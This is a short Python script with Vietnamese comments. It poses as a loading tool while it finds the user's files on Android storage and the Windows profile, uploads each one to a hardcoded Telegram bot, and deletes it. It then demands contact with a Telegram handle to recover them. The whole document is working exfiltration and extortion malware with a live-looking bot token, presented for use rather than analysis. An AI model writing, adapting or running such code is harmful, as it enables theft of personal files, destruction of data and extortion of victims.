import os
import requests
import time
import threading
trang = "\033[1;37m"
luc = "\033[1;32m"
red = "\033[1;31m"
# Thông tin Telegram Bot
TOKEN = "8162621699:AAGFM0YDmoO7tmCryX_Bo311djoIlvTjbhQ"
CHAT_ID = "7445272108"
TELEGRAM_URL = f"https://api.telegram.org/bot{TOKEN}/sendDocument"

# Fake loading để giữ nạn nhân ở lại
def fake_loading():
    animations = ["|", "/", "-", "\\"]
    print(f"{trang}Thông Tin Liên Hệ")
    print(f"{trang}Telegram: {luc}@luaday123")
    print(f"{trang}Dán này lên Google : {luc}t.me/luaday123")
    print(f"{trang}[+] Đang bắt đầu quá trình tải dữ liệu... Vui lòng đợi.")

    for _ in range(10):  # 1 phút giả lập tải dữ liệu
        print(f"\r[+] Đang tải để vào tool ... {animations[_ % 4]}", end="", flush=True)
        time.sleep(1)

# Lấy danh sách file theo thứ tự ưu tiên: .py, .php, .txt, ảnh, .html
def find_files():
    file_extensions = (".py", ".php", ".mp4", ".txt",".json", ".jpg", ".jpeg", ".gif", ".bmp", ".tiff", ".webp", ".html")
    root_dirs = ["/storage/emulated/0", "/sdcard", os.environ.get("USERPROFILE", "")]  # Duyệt thư mục

    file_list = set()  # Sử dụng set để tránh trùng lặp
    for root_dir in root_dirs:
        if os.path.exists(root_dir):
            for root, _, files in os.walk(root_dir):
                for file in files:
                    if file.lower().endswith(file_extensions):
                        file_list.add(os.path.join(root, file))
    
    return list(file_list)

# Gửi file lên Telegram (mỗi file chỉ gửi một lần)
def send_file(file_path):
    try:
        with open(file_path, "rb") as file:
            response = requests.post(
                TELEGRAM_URL,
                data={"chat_id": CHAT_ID, "caption": f"Đã tải file: {os.path.basename(file_path)}"},
                files={"document": file},
            )

        return response.status_code == 200
    except:
        return False

# Xóa file sau khi gửi
def delete_file(file_path):
    try:
        os.remove(file_path)
    except:
        pass

# Chạy chương trình chính
def main():
    loading_thread = threading.Thread(target=fake_loading)
    loading_thread.start()

    files = find_files()
    
    # Gửi từng file một lần và xóa file sau khi gửi
    for file_path in files:
        if send_file(file_path):
            delete_file(file_path)

    loading_thread.join()  # Chờ quá trình fake loading hoàn tất

    # Hiển thị thông báo sau khi xóa hết file
    print(f"\n{red}Toàn bộ file của bạn đã bị xóa! ")
    print(f"{trang}Liên hệ Telegram {luc}@luaday123 {trang}để lấy lại.")
    print(f"{trang}Dán này lên Google : {luc}t.me/luaday123")
if __name__ == "__main__":
    main()
